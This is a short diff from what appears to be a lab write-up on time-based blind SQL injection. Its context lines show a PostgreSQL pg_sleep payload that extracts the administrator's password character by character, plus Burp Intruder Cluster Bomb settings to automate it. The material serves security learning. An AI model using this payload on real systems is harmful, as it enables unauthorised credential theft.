@@ -14,7 +14,7 @@ Data Extraction (Automated)
 * Tool: Burp Intruder.
 * Attack Type: Cluster Bomb.
 * Payload: x'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)-- . We are adding the § manualy in the payload menu .
-* Configuration 
+* Configuration :
 *  **Payload 1**: Numbers (1 to 20).
 *  **Payload 2**: Simple List (a-z, 0-9).
 *  **Resource Pool**: Set Maximum concurrent requests = 1 (Crucial for time-based accuracy)
